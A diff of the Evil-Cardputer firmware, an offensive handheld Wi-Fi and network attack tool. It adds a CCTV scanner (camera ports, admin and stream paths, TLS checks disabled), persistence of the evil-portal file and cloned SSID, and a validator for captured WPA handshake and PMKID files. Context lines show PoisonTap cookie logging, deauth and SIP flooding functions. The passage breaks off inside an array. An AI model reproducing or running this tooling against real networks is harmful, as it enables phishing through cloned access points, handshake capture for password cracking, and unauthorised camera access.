@@ -28,6 +28,8 @@
    Users are required to comply with all applicable laws and regulations in their jurisdiction
    regarding network testing and ethical hacking.
 */
+struct StreamItem;
+struct UrlParts;
 
 #include <WiFi.h>
 #include <WebServer.h>
@@ -182,8 +184,9 @@ static const char * const PROGMEM menuItems[] = {
   "SIP enumeration",
   "SIP Message Spoof",
   "SIP Flooding",
-  "SIP Ring All", 
-  "Settings"
+  "SIP Ring All",
+  "CCTV Toolkit",
+  "Settings",
 };
 
 
@@ -525,16 +528,6 @@ void releaseBLE() {
 }
 
 
-#include <esp_heap_caps.h>   // pour heap_caps_get_free_size()
-#include <Arduino.h>         // pour Serial, ESP.getFreeHeap()
-
-void logMem(const char* tag) {
-  Serial.printf("[%s] Free IRAM heap: %u bytes\n",
-                tag, heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
-  Serial.printf("[%s] Free DRAM heap: %u bytes\n",
-                tag, ESP.getFreeHeap());
-}
-
 void setup() {
   M5.begin();
   Serial.begin(115200);
@@ -625,6 +618,7 @@ void setup() {
     "Time to learn something",
     "U Like Karma? Check Mana",
     "   42 because Universe ",
+    "Did you find the easter egg?",
     "Navigating the Cosmos...",
     "Unlocking Stellar Secrets",
     "Galactic Journeys Await..",
@@ -683,7 +677,7 @@ void setup() {
     "Butters Awkward Escapades",
     "Navigating the Multiverse",
     "Affirmative Dave, I read you.",
-    "Your Evil-M5Core2 have died of dysentery",
+    "Your Evil-Cardputer have died of dysentery",
     "Did you disable PSRAM ?",
     "You already star project?",
     "Rick's Portal Gun Activated...",
@@ -962,6 +956,8 @@ void setup() {
   restoreConfigParameter("llm_model");
   restoreConfigParameter("llm_max_tokens");
   restoreConfigParameter("evilChatNickname");
+  restoreConfigParameter("portal_file");
+  restoreConfigParameter("cloned_ssid");
 
   int textY = 30;
   int lineOffset = 10;
@@ -978,7 +974,7 @@ void setup() {
   // Textes à afficher
   const char* text1 = "Evil-Cardputer";
   const char* text2 = "By 7h30th3r0n3";
-  const char* text3 = "v1.4.2 2025";
+  const char* text3 = "v1.4.3 2025";
 
   // Mesure de la largeur du texte et calcul de la position du curseur
   int text1Width = M5.Lcd.textWidth(text1);
@@ -1008,7 +1004,7 @@ void setup() {
   Serial.println(F("-------------------"));
   Serial.println(F("Evil-Cardputer"));
   Serial.println(F("By 7h30th3r0n3"));
-  Serial.println(F("v1.4.2 2025"));
+  Serial.println(F("v1.4.3 2025"));
   Serial.println(F("-------------------"));
   // Diviser randomMessage en deux lignes pour s'adapter à l'écran
   int maxCharsPerLine = screenWidth / 10;  // Estimation de 10 pixels par caractère
@@ -1441,8 +1437,9 @@ void executeMenuItem(int index) {
     case 62: sipEnumExtensions(); break;
     case 63: sipSpoofMessage(); break;
     case 64: sipFlood(); break;
-    case 65: sipRingAll(); break; 
-    case 66: showSettingsMenu(); break;
+    case 65: sipRingAll(); break;
+    case 66: scanCCTVCameras(); break;
+    case 67: showSettingsMenu(); break;
   }
   isOperationInProgress = false;
 }
@@ -1454,6 +1451,13 @@ bool buttonPressed = false;
 void enterDebounce() {
   while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
     M5.update();
+    M5Cardputer.update();
+    delay(10); // Petit délai pour réduire la charge du processeur
+  }
+}
+
+void backDebounce() {
+  while (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
     M5Cardputer.update();
     delay(10); // Petit délai pour réduire la charge du processeur
   }
@@ -2179,9 +2183,9 @@ bool isSaveFileAuthorized = false; // Authorization flag for saving file
 
 
 /*
-============================================================================================================================
-PoisonTap
-============================================================================================================================
+  ============================================================================================================================
+  PoisonTap
+  ============================================================================================================================
 */
 void logCookiesToSD(String cookies, String domain) {
   File file = SD.open("/evil/cookies.log", FILE_APPEND);
@@ -2839,7 +2843,7 @@ void createCaptivePortal() {
 
   server.begin();
   Serial.println(F("-------------------"));
-  Serial.println("Portal " + ssid + " Deployed with " + selectedPortalFile.substring(12) + " Portal !");
+  Serial.println("Portal " + ssid + " Deployed with " + selectedPortalFile.substring(7) + " Portal !");
   Serial.println(F("-------------------"));
   if (ledOn) {
     pixels.setPixelColor(0, pixels.Color(255, 0, 0));
@@ -3068,7 +3072,7 @@ void handleDownloadAllFiles() {
 void handleFileUpload() {
   HTTPUpload& upload = server.upload();
   String password = server.arg("pass");
-  const size_t MAX_UPLOAD_SIZE = 8192;
+  const size_t MAX_UPLOAD_SIZE = 16384;
 
   if (password != accessWebPassword) {
     Serial.println(F("Unauthorized access attempt"));
@@ -3486,6 +3490,34 @@ void displayCredentials(int index) {
 Confirm pop up yes/no
 ============================================================================================================================
 */
+
+
+void okPopup(String message) {
+  M5.Display.clear();
+  M5.Display.setTextSize(1.5);
+
+  int messageWidth = message.length() * 9;  // Approximate character width
+  int startX = (M5.Display.width() - messageWidth) / 2;
+
+  M5.Display.setCursor(startX, M5.Display.height() / 2 - 20);
+  M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
+  M5.Display.println(message);
+
+  // Draw OK button
+  M5.Display.setTextColor(TFT_BLUE);
+  M5.Display.setCursor((M5.Display.width() - 18) / 2, M5.Display.height() / 2 + 20);
+  M5.Display.print("OK");
+
+  M5.Display.display();
+  enterDebounce();
+  while (true) {
+    M5.update();
+    M5Cardputer.update();
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+      break;
+    }
+  }
+}
 
 bool confirmPopup(String message) {
   bool confirm = false;
@@ -4071,7 +4103,8 @@ void showSettingsMenu() {
         options.push_back({"Set Startup Volume", adjustVolume});
         options.push_back({"Set Startup Sound", setStartupSound});
         options.push_back({randomOn ? "Random startup Off" : "Random startup On", []() {toggleRandom();}});
-
+        options.push_back({"Save current Portal & SSID", []() { saveCurrentPortalAndSSID(); }});
+        
         loopOptions(options, false, true, "Settings");
 
         // Vérifie si BACKSPACE a été pressé pour quitter le menu
@@ -4748,6 +4781,95 @@ void saveConfigParameter(String key, int value) {
   }
 }
 
+
+// Sauvegarde/maj de portal_file dans /config/config.txt
+void savePortalFileConfig(const String &pathIn) {
+  String portalPath = pathIn;
+  if (!portalPath.startsWith("/evil/sites/")) portalPath = "/evil/sites/" + portalPath;
+
+  if (!SD.exists(portalPath)) {
+    Serial.println("savePortalFileConfig: portal not found on SD -> " + portalPath);
+    return;
+  }
+
+  if (!SD.exists(configFolderPath)) SD.mkdir(configFolderPath);
+
+  String content = "";
+  bool found = false;
+
+  File f = SD.open(configFilePath, FILE_READ);
+  if (f) {
+    while (f.available()) {
+      String line = f.readStringUntil('\n');
+      if (line.startsWith("portal_file=")) {
+        content += "portal_file=" + portalPath + "\n";
+        found = true;
+      } else {
+        content += line + "\n";
+      }
+    }
+    f.close();
+  }
+
+  if (!found) content += "portal_file=" + portalPath + "\n";
+
+  f = SD.open(configFilePath, FILE_WRITE);
+  if (f) {
+    f.print(content);
+    f.close();
+    Serial.println("portal_file saved: " + portalPath);
+  } else {
+    Serial.println(F("savePortalFileConfig: write error"));
+  }
+}
+
+// Sauvegarde/maj de cloned_ssid dans /config/config.txt
+void saveClonedSSIDConfig(const String &ssid) {
+  if (ssid.length() == 0) {
+    Serial.println(F("saveClonedSSIDConfig: empty SSID -> abort"));
+    return;
+  }
+
+  if (!SD.exists(configFolderPath)) SD.mkdir(configFolderPath);
+
+  String content = "";
+  bool found = false;
+
+  File f = SD.open(configFilePath, FILE_READ);
+  if (f) {
+    while (f.available()) {
+      String line = f.readStringUntil('\n');
+      if (line.startsWith("cloned_ssid=")) {
+        content += "cloned_ssid=" + ssid + "\n";
+        found = true;
+      } else {
+        content += line + "\n";
+      }
+    }
+    f.close();
+  }
+
+  if (!found) content += "cloned_ssid=" + ssid + "\n";
+
+  f = SD.open(configFilePath, FILE_WRITE);
+  if (f) {
+    f.print(content);
+    f.close();
+    Serial.println("cloned_ssid saved: " + ssid);
+  } else {
+    Serial.println(F("saveClonedSSIDConfig: write error"));
+  }
+}
+
+// Wrapper appelé par le menu Settings
+void saveCurrentPortalAndSSID() {
+  Serial.println(F("Saving portal_file & cloned_ssid to config.txt"));
+  savePortalFileConfig(selectedPortalFile);
+  saveClonedSSIDConfig(clonedSSID);
+  waitAndReturnToMenu("Config saved"); // même UX que le reste du projet
+}
+
+
 void restoreConfigParameter(String key) {
   if (SD.exists(configFilePath)) {
     File configFile = SD.open(configFilePath, FILE_READ);
@@ -4845,8 +4967,19 @@ void restoreConfigParameter(String key) {
           } else if (key == "evilChatNickname") {
             stringValue.toCharArray(currentNick, sizeof(currentNick));
             Serial.println("Nickname restored to " + String(currentNick));
+          } else if (key == "portal_file") {
+            String v = stringValue;
+            if (!v.startsWith("/evil/sites/")) v = "/evil/sites/" + v;
+            if (SD.exists(v)) {
+              selectedPortalFile = v;
+              Serial.println("Portal file restored to " + selectedPortalFile);
+            } else {
+              Serial.println("portal_file not found on SD, keep: " + selectedPortalFile);
+            }
+          } else if (key == "cloned_ssid") {
+            clonedSSID = stringValue;
+            Serial.println("Cloned SSID restored to " + clonedSSID);
           }
-
           keyFound = true;
           break;
         }
@@ -4890,7 +5023,8 @@ void restoreConfigParameter(String key) {
           snprintf(currentNick, sizeof(currentNick), "noname%04d", random(0, 10000));
           currentNick[sizeof(currentNick) - 1] = '\0';
           Serial.println("Default Nickname generated: " + String(currentNick));
-        }
+        } else if (key == "portal_file") { selectedPortalFile = "/sites/normal.html"; }
+          else if (key == "cloned_ssid") { clonedSSID = "Evil-Cardputer"; }
       }
 
       // Application booléens
@@ -4942,7 +5076,8 @@ void restoreConfigParameter(String key) {
       snprintf(currentNick, sizeof(currentNick), "noname%04d", random(0, 10000));
       currentNick[sizeof(currentNick) - 1] = '\0';
       Serial.println("Default Nickname generated: " + String(currentNick));
-    }
+    } else if (key == "portal_file") { selectedPortalFile = "/sites/normal.html"; }
+      else if (key == "cloned_ssid") { clonedSSID = "Evil-Cardputer"; }
   }
 }
 
@@ -6418,9 +6553,9 @@ Wardriving
 
 String createPreHeader() {
   String preHeader = "WigleWifi-1.4";
-  preHeader += ",appRelease=v1.4.2"; // Remplacez [version] par la version de votre application
+  preHeader += ",appRelease=v1.4.3"; // Remplacez [version] par la version de votre application
   preHeader += ",model=Cardputer";
-  preHeader += ",release=v1.4.2"; // Remplacez [release] par la version de l'OS de l'appareil
+  preHeader += ",release=v1.4.3"; // Remplacez [release] par la version de l'OS de l'appareil
   preHeader += ",device=Evil-Cardputer"; // Remplacez [device name] par un nom de périphérique, si souhaité
   preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
   preHeader += ",board=M5Cardputer";
@@ -8424,100 +8559,334 @@ void deauthClients() {
 
 // Sniff and deauth clients end
 
-
-
 /*
 ============================================================================================================================
-Check handshake
+Check handshake  –  full SNAP-sliding integration  (29-07-2025)
 ============================================================================================================================
 */
+
+#define DEBUG_HANDSHAKE 1          // 1 = logs série détaillés, 0 = silencieux
+
+/* --- dossiers & variables UI --- */
+const char* HANDSHAKES_DIR = "/evil/handshakes";
 std::vector<String> pcapFiles;
 int currentListIndexPcap = 0;
 
-void checkHandshakes() {
-  loadPcapFiles();
-  displayPcapList();
-  enterDebounce();
+/* --- signature SNAP --- */
+const uint8_t SNAP_SIG[8] = {0xAA,0xAA,0x03,0x00,0x00,0x00,0x88,0x8E};
 
-  unsigned long lastKeyPressTime = 0;  // Temps de la dernière pression de touche
-  const unsigned long debounceDelay = 250;  // Delai de debounce en millisecondes
+/* --- masques Key-Info --- */
+constexpr uint16_t KI_INSTALL = 0x0040;
+constexpr uint16_t KI_ACK     = 0x0080;
+constexpr uint16_t KI_MIC     = 0x0100;
+constexpr uint16_t KI_SECURE  = 0x0200;
 
-  while (true) {
-    M5.update();
-    M5Cardputer.update();
-    unsigned long currentPressTime = millis();
+/* --- headers PCAP --- */
+#pragma pack(push,1)
+struct GHdr { uint32_t magic; uint16_t vmaj,vmin; int32_t tz; uint32_t sig,snap,link; };
+struct PHdr { uint32_t ts_sec,ts_usec,len,orig; };
+#pragma pack(pop)
 
-    if (M5Cardputer.Keyboard.isKeyPressed('.') && (currentPressTime - lastKeyPressTime > debounceDelay)) {
-      navigatePcapList(true); // naviguer vers le bas
-      lastKeyPressTime = currentPressTime;
-    }
-    if (M5Cardputer.Keyboard.isKeyPressed(';') && (currentPressTime - lastKeyPressTime > debounceDelay)) {
-      navigatePcapList(false); // naviguer vers le haut
-      lastKeyPressTime = currentPressTime;
-    }
-    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && (currentPressTime - lastKeyPressTime > debounceDelay)) {
-      waitAndReturnToMenu("return to menu");
-      return;
-    } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
-      inMenu = true;
-      drawMenu();
-      break;
-    }
-  }
+/* --- helpers --- */
+String macToString(const uint8_t* m){
+  char b[18]; sprintf(b,"%02X:%02X:%02X:%02X:%02X:%02X",m[0],m[1],m[2],m[3],m[4],m[5]);
+  return String(b);
 }
+String makeFullPath(const String& n){ return n.startsWith("/") ? n : String(HANDSHAKES_DIR)+"/"+n; }
 
 
-void loadPcapFiles() {
-  File root = SD.open("/evil/handshakes");
-  pcapFiles.clear();
-  while (File file = root.openNextFile()) {
-    if (!file.isDirectory()) {
-      String filename = file.name();
-      if (filename.endsWith(".pcap")) {
-        pcapFiles.push_back(filename);
+/* ======================================================================================================================
+   handlePcapSliding  —  détection Beacon + (4-Way || PMKID) — version “robuste” 08-08-2025
+   ==================================================================================================================== */
+bool handlePcapSliding(const String& path,
+                       bool& hasBeacon, bool& has4Way, bool& hasPMKID,
+                       String& apMac,  String& staMac)
+{
+  hasBeacon = has4Way = hasPMKID = false;
+  apMac = staMac = ssid = "";
+
+  File f = SD.open(path, FILE_READ);
+  if(!f){ Serial.println("[PCAP] open FAIL "+path); return false; }
+
+  /* ---------- entête global ---------- */
+  GHdr gh;
+  if(f.read((uint8_t*)&gh,sizeof(gh)) != sizeof(gh)){ f.close(); return false; }
+  const bool linkIsRadiotap = (gh.link == 127);           // DLT_IEEE802_11_RADIO
+
+  static uint8_t buf[4096];
+  bool m1=false, m2=false, m3=false, m4=false;            // drapeaux 4-Way
+  uint32_t idx = 0;
+
+#if DEBUG_HANDSHAKE
+  static bool first = true;
+  if(!first) Serial.println();
+  first = false;
+  Serial.printf("=== %s ===\n", path.c_str());
+#endif
+
+  while(f.available()){
+    /* ---------- lecture d’un paquet ---------- */
+    PHdr ph;
+    if(f.read((uint8_t*)&ph,sizeof(ph)) != sizeof(ph)) break;
+    if(ph.len==0 || ph.len>sizeof(buf)){ f.seek(f.position()+ph.len); continue; }
+    if(f.read(buf,ph.len) != ph.len) break;
+    ++idx;
+
+    /* ---------- calcule l’offset vers la charge utile ---------- */
+    uint16_t off = 0;
+    if(linkIsRadiotap){
+      if(ph.len < 4) continue;                   // paquet trop court
+      off = buf[2] | (buf[3]<<8);                // radiotap length
+      if(off >= ph.len) continue;
+    }
+
+    const uint8_t* pay   = buf + off;            // début 802.11 ou Ethernet
+    const uint8_t* pEnd  = buf + ph.len;
+    const uint8_t* key   = nullptr;
+
+    /* ---------- Beacon : on capture BSSID + SSID (une seule fois) ---------- */
+    if(!hasBeacon){
+      uint8_t fc0 = pay[0];
+      if( ((fc0>>2)&0x03)==0 && ((fc0>>4)&0x0F)==8 ){     // mgmt / beacon
+        hasBeacon = true;
+        apMac = macToString(pay + 10);                    // BSSID
+        uint32_t p = off + 24;                            // tags
+        while(p+2 < ph.len){
+          uint8_t tag = buf[p], len = buf[p+1];
+          if(tag==0x00 && len<=32 && p+2+len<=ph.len){
+            char s[33]; memcpy(s,buf+p+2,len); s[len]='\0'; ssid = String(s);
+            break;
+          }
+          p += 2 + len;
+        }
       }
     }
+
+    /* ---------- repérage EAPOL (2 formats possibles) ---------- */
+    for(const uint8_t* p = pay; p + 14 < pEnd; ++p){
+      /* LLC/SNAP */
+      if(p[0]==0xAA && p[1]==0xAA && p[2]==0x03 && p[6]==0x88 && p[7]==0x8E){
+        key = p + 8;                               // version|type|len|…
+        break;
+      }
+      /* Ethernet brut (dest+src+type) */
+      if(p[12]==0x88 && p[13]==0x8E){
+        key = p + 14;
+        break;
+      }
+    }
+    if(!key) continue;                             // pas d’EAPOL
+    if(key+99 >= pEnd || key[1]!=3) continue;       // paquets non-Key ou tronqués
+
+    /* ---------- interprétation Key-Info ---------- */
+    uint16_t ki = (key[5]<<8) | key[6];
+    bool ack     = ki & KI_ACK;
+    bool mic     = ki & KI_MIC;
+    bool install = ki & KI_INSTALL;
+    bool secure  = ki & KI_SECURE;
+
+    if( ack && !mic)                       m1 = true;                 // Msg-1
+    if(!ack &&  mic && !install && !secure) m2 = true;                // Msg-2
+    if( ack &&  mic &&  install &&  secure) m3 = true;                // Msg-3
+    if(!ack &&  mic && !install &&  secure) m4 = true;                // Msg-4
+
+    /* ---------- PMKID ---------- */
+    uint16_t kdLen = (key[97]<<8)|key[98];
+    if(!hasPMKID && !install && kdLen==0x0016) hasPMKID = true;
+
+#if DEBUG_HANDSHAKE
+    Serial.printf("Pkt%3lu EAPOL  KI=%04X "
+                  "I%d A%d M%d S%d   [%c%c%c%c]\n",
+                  idx, ki,
+                  install, ack, mic, secure,
+                  m1?'1':'-', m2?'2':'-', m3?'3':'-', m4?'4':'-');
+#endif
   }
-  if (pcapFiles.size() > 0) {
-    currentListIndexPcap = 0; // Réinitialisez l'indice si de nouveaux fichiers sont chargés
-  }
+  f.close();
+
+  has4Way = m1 && m2 && m3 && m4;
+  return true;
 }
 
-void displayPcapList() {
-  const int listDisplayLimit = M5.Display.height() / 18;
-  int listStartIndex = max(0, min(currentListIndexPcap, int(pcapFiles.size()) - listDisplayLimit));
 
-  M5.Display.clear();
-  M5.Display.setTextSize(1.5);
-  for (int i = listStartIndex; i < min(int(pcapFiles.size()), listStartIndex + listDisplayLimit); i++) {
-    if (i == currentListIndexPcap) {
-      M5.Display.fillRect(0, (i - listStartIndex) * 18, M5.Display.width(), 18, menuSelectedBackgroundColor);
-      M5.Display.setTextColor(menuTextFocusedColor);
-    } else {
-      M5.Display.setTextColor(menuTextUnFocusedColor);
-    }
-    M5.Display.setCursor(10, (i - listStartIndex) * 18);
-    M5.Display.println(pcapFiles[i]);
+
+/* ------------------------------------------------------------------------------------------------------------------
+   showPcapInfo(index) — afﬁche la synthèse d’un PCAP (utilise la nouvelle handlePcapSliding)
+   ------------------------------------------------------------------------------------------------------------------ */
+void showPcapInfo(int index){
+  String entry = pcapFiles[index];
+  String path  = makeFullPath(entry);
+
+  bool bc=false, fw=false, pm=false;
+  String ap="", sta="", ssid="";
+  if(!handlePcapSliding(path, bc, fw, pm, ap, sta)){
+    confirmPopup("Open error\n"+entry);
+    return;
   }
+
+  bool ok = bc && (fw || pm);
+
+  M5.Display.clear(); M5.Display.setTextSize(1.5);
+  M5.Display.setCursor(0,0);
+  M5.Display.println(entry);
+  M5.Display.println("----------------------");
+  M5.Display.printf("Beacon : %s\n", bc ? "YES" : "NO");
+  M5.Display.printf("4-Way  : %s\n", fw ? "YES" : "NO");
+  M5.Display.printf("PMKID  : %s\n", pm ? "YES" : "NO");
+  M5.Display.println("----------------------");
+  M5.Display.printf("Result : %s\n", ok ? "VALID" : "INVALID");
+  M5.Display.println("\n   ^ / v  : next / prev");
   M5.Display.display();
 }
 
-void navigatePcapList(bool next) {
-  if (next) {
-    currentListIndexPcap++;
-    if (currentListIndexPcap >= pcapFiles.size()) {
-      currentListIndexPcap = 0;
-    }
-  } else {
-    currentListIndexPcap--;
-    if (currentListIndexPcap < 0) {
-      currentListIndexPcap = pcapFiles.size() - 1;
+
+/* ------------------------------------------------------------------------------------------------------------------
+   viewPcapDetails()  —  affiche + navigation entre .pcap, ⌫ = retour liste
+   ------------------------------------------------------------------------------------------------------------------ */
+void viewPcapDetails(){
+  const unsigned long db = 180;
+  unsigned long last = 0;
+
+  while(true){
+    showPcapInfo(currentListIndexPcap);           // affiche fiche courante
+
+    while(true){
+      M5.update(); M5Cardputer.update(); unsigned long now = millis();
+
+      if(M5Cardputer.Keyboard.isKeyPressed('.') && now-last > db){
+        /* suivant (skip ALL) */
+        do{
+          currentListIndexPcap = (currentListIndexPcap+1)%pcapFiles.size();
+        }while(pcapFiles[currentListIndexPcap]=="ALL");
+        last = now; break;                        // ↺ ré-affiche
+      }
+      if(M5Cardputer.Keyboard.isKeyPressed(';') && now-last > db){
+        /* précédent (skip ALL) */
+        do{
+          currentListIndexPcap = currentListIndexPcap ?
+                                 currentListIndexPcap-1 : pcapFiles.size()-1;
+        }while(pcapFiles[currentListIndexPcap]=="ALL");
+        last = now; break;                        // ↺ ré-affiche
+      }
+      if(M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)){
+        while (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+          M5Cardputer.update();
+          delay(10); 
+        }
+        return;
+      }
     }
   }
+}
+
+
+
+/* ======================================================================================================================
+   analyzeAllPcaps  —  scanne tous les fichiers, propose de supprimer les invalides
+   ==================================================================================================================== */
+void analyzeAllPcaps(){
+  std::vector<String> invalid;
+  size_t ok = 0, total = pcapFiles.size() - 1;
+
+  for(size_t i = 1; i < pcapFiles.size(); ++i){
+    bool b=false,fw=false,pm=false; String ap="",st="";
+    if(handlePcapSliding(makeFullPath(pcapFiles[i]), b, fw, pm, ap, st)
+       && b && (fw || pm))
+      ok++;
+    else
+      invalid.push_back(pcapFiles[i]);
+  }
+
+  char buf[64]; sprintf(buf,"%d / %d files valid", (int)ok, (int)total);
+  okPopup(String(buf));
+
+  if(invalid.empty()) return;                       // tout est bon
+
+  sprintf(buf,"Delete %d invalid files ?", (int)invalid.size());
+  if(!confirmPopup(String(buf))) return;
+
+  for(const String& fn : invalid){
+    String p = makeFullPath(fn);
+    if(SD.exists(p)) SD.remove(p);
+  }
+  loadPcapFiles();          // maj de la liste
   displayPcapList();
 }
-//Check handshake end
 
+
+
+/* ======================================================================================================================
+   charge la liste .pcap
+   ==================================================================================================================== */
+void loadPcapFiles(){
+  pcapFiles.clear(); pcapFiles.push_back("ALL");
+  File root=SD.open(HANDSHAKES_DIR);
+  while(File f=root.openNextFile()){
+    if(!f.isDirectory() && String(f.name()).endsWith(".pcap")) pcapFiles.push_back(String(f.name()));
+  }
+  currentListIndexPcap=0;
+}
+
+/* --------- UI --------- */
+void displayPcapList(){
+  const int h=18, win=M5.Display.height()/h;
+  int s=max(0,min(currentListIndexPcap,int(pcapFiles.size())-win));
+  M5.Display.clear(); M5.Display.setTextSize(1.5);
+  for(int i=s;i<min(int(pcapFiles.size()),s+win);++i){
+    if(i==currentListIndexPcap){
+      M5.Display.fillRect(0,(i-s)*h,M5.Display.width(),h,menuSelectedBackgroundColor);
+      M5.Display.setTextColor(menuTextFocusedColor);
+    }else M5.Display.setTextColor(menuTextUnFocusedColor);
+    M5.Display.setCursor(10,(i-s)*h); M5.Display.println(pcapFiles[i]);
+  }
+  M5.Display.display();
+}
+void navigatePcapList(bool next){
+  currentListIndexPcap = next ? (currentListIndexPcap+1)%pcapFiles.size()
+                              : (currentListIndexPcap?currentListIndexPcap-1:pcapFiles.size()-1);
+  displayPcapList();
+}
+
+/* ======================================================================================================================
+   checkHandshakes  —  point d’entrée du sous-menu “Handshakes”
+   ==================================================================================================================== */
+void checkHandshakes(){
+  loadPcapFiles();
+  displayPcapList();        // première vue = liste
+  enterDebounce();
+
+  const unsigned long db = 250;
+  unsigned long       t  = 0;
+
+  while(true){
+    M5.update(); M5Cardputer.update(); unsigned long n = millis();
+
+    /* déplacement curseur dans la liste */
+    if(M5Cardputer.Keyboard.isKeyPressed('.') && n-t > db){ navigatePcapList(true);  t=n; }
+    if(M5Cardputer.Keyboard.isKeyPressed(';') && n-t > db){ navigatePcapList(false); t=n; }
+
+    /* sélection */
+    if(M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && n-t > db){
+      String sel = pcapFiles[currentListIndexPcap];
+      if(sel == "ALL"){
+        analyzeAllPcaps();
+        displayPcapList();                         // on reste dans la liste
+      }else{
+        viewPcapDetails();                         // ↩ revient dans la liste
+        displayPcapList();                         // rafraîchir l’écran
+      }
+      t = millis();
+    }
+
+    /* retour Menu général */
+    if(M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)){
+      waitAndReturnToMenu("Return to menu");
+      return;
+    }
+  }
+}
+
+/* ==================================================== FIN ========================================================= */
 
 /*
 ============================================================================================================================
@@ -10862,7 +11231,7 @@ unsigned long lastLog = 0;
 int currentScreen   = 1;  // 1=GeneralInfo, 2=ReceivedData
 
 const String wigleHeaderFileFormat =
-  "WigleWifi-1.4,appRelease=v1.4.2,model=Cardputer,release=v1.4.2,"
+  "WigleWifi-1.4,appRelease=v1.4.3,model=Cardputer,release=v1.4.3,"
   "device=Evil-Cardputer,display=7h30th3r0n3,board=M5Cardputer,brand=M5Stack";
 
 char* log_col_names[LOG_COLUMN_COUNT] = {
@@ -18681,7 +19050,7 @@ void startUARTShell() {
 
 /*
 ============================================================================================================================
-SIP TOOLBOX
+SIP TOOLKIT
 ============================================================================================================================
 */
 
@@ -18823,7 +19192,7 @@ void sipScan() {
                  "From: \"Evil-Cardputer\" <sip:scan@" + WiFi.localIP().toString() + ">;tag=1\r\n"
                  "To: <sip:" + dst.toString() + ">\r\n"
                  "Call-ID: " + genCallID() + "\r\nCSeq: 1 OPTIONS\r\n"
-                 "Max-Forwards: 70\r\nUser-Agent: Evil-Cardputer/1.4.2\r\n"
+                 "Max-Forwards: 70\r\nUser-Agent: Evil-Cardputer/1.4.3\r\n"
                  "Content-Length: 0\r\n\r\n";
 
     sendSIPRaw(dst, pkt);
@@ -19050,7 +19419,7 @@ void sipRingAll() {
                  "To: <sip:" + dst.toString() + "@" + dst.toString() + ">\r\n"
                  "Call-ID: " + callid + "\r\nCSeq: 1 INVITE\r\n"
                  "Max-Forwards: 70\r\nContact: <sip:ring@" + WiFi.localIP().toString() + ">\r\n"
-                 "User-Agent: Evil-Cardputer/1.4.2\r\n" +
+                 "User-Agent: Evil-Cardputer/1.4.3\r\n" +
                  (addSDP ? String("Content-Type: application/sdp\r\n") : "") +
                  "Content-Length: " + String(addSDP ? sdp.length() : 0) + "\r\n\r\n" +
                  (addSDP ? sdp : "");
@@ -19078,3 +19447,2771 @@ void sipRingAll() {
   sipUdp.stop();
   waitAndReturnToMenu("RingAll done (" + String(dlg.size()) + " INVITE)");
 }
+
+/*
+============================================================================================================================
+CCTV TOOLKIT
+============================================================================================================================
+*/
+
+std::vector<IPAddress> hostslistCCTV;   // globale (ne pas masquer)
+
+
+// ====== Constantes ======
+
+// Ports HTTPS additionnels
+const uint16_t httpsPorts[] PROGMEM = { 443, 8443, 8444 };
+
+// User-Agent et Accept (headers globaux pour HTTPClient)
+static const char UA_STR[] PROGMEM =
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+  "(KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36";
+static const char ACCEPT_STR[] PROGMEM =
+  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
+
+inline bool isHttpsPort(uint16_t p) {
+  for (size_t i = 0; i < sizeof(httpsPorts)/sizeof(httpsPorts[0]); ++i) {
+    if (p == pgm_read_word(&httpsPorts[i])) return true;
+  }
+  return false;
+}
+
+/* Détermine le protocole depuis le port (étendu) */
+const char* protoFromPort(uint16_t p) {
+  return isHttpsPort(p) ? "https" : "http";
+}
+
+// ==== utilitaire interne : begin HTTP/HTTPS avec follow redirects, TLS insecure si besoin ====
+void httpBeginAuto(HTTPClient& http, WiFiClient& cli, WiFiClientSecure& tls, const String& fullUrl) {
+  if (fullUrl.startsWith("https://")) {
+    tls.setInsecure();
+    http.begin(tls, fullUrl);
+  } else {
+    http.begin(cli, fullUrl);
+  }
+  http.setTimeout(500); // TIMEOUT étendu
+  http.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);
+  // Headers par défaut
+  char uaBuf[128]; strncpy(uaBuf, UA_STR, sizeof(uaBuf));
+  char acBuf[128]; strncpy(acBuf, ACCEPT_STR, sizeof(acBuf));
+  http.addHeader("User-Agent", uaBuf, true, true);
+  http.addHeader("Accept", acBuf, true, true);
+}
+
+/**** Ports à balayer (liste étendue) ****/
+const uint16_t cameraPorts[] PROGMEM = {
+  // Web
+  80, 443, 8080, 8443, 8000, 8001, 8008, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089,
+  8090, 8091, 8092, 8093, 8094, 8095, 8096, 8097, 8098, 8099,
+  // RTSP
+  554, 8554, 10554, 1554, 2554, 3554, 4554, 5554, 6554, 7554, 9554,
+  // RTMP
+  1935, 1936, 1937, 1938, 1939,
+  // ONVIF / découverte
+  3702,
+  // Divers fabricants
+  37777, 5000
+};
+const size_t NB_CAMERA_PORTS = sizeof(cameraPorts) / sizeof(cameraPorts[0]);
+
+/**** Paths HTTP/HTTPS courants (liste étendue) ****/
+const char * const cameraPaths[] PROGMEM = {
+  "/", "/1", "/admin", "/login", "/viewer", "/webadmin", "/video", "/stream", "/live",
+  "/snapshot", "/onvif-http/snapshot", "/system.ini", "/config", "/setup", "/cgi-bin/",
+  "/api/", "/camera", "/img/main.cgi", "/index.html", "/onvif/device_service", "/onvif/streaming",
+  "/axis-cgi/mjpg/video.cgi", "/axis-cgi/com/ptz.cgi", "/axis-cgi/param.cgi",
+  "/cgi-bin/snapshot.cgi", "/cgi-bin/hi3510/snap.cgi", "/videostream.cgi", "/mjpg/video.mjpg"
+};
+const size_t NB_CAMERA_PATHS = sizeof(cameraPaths) / sizeof(cameraPaths[0]);
+
+/**** Content-Types indicateurs caméra ****/
+const char * const camContentTypes[] PROGMEM = {
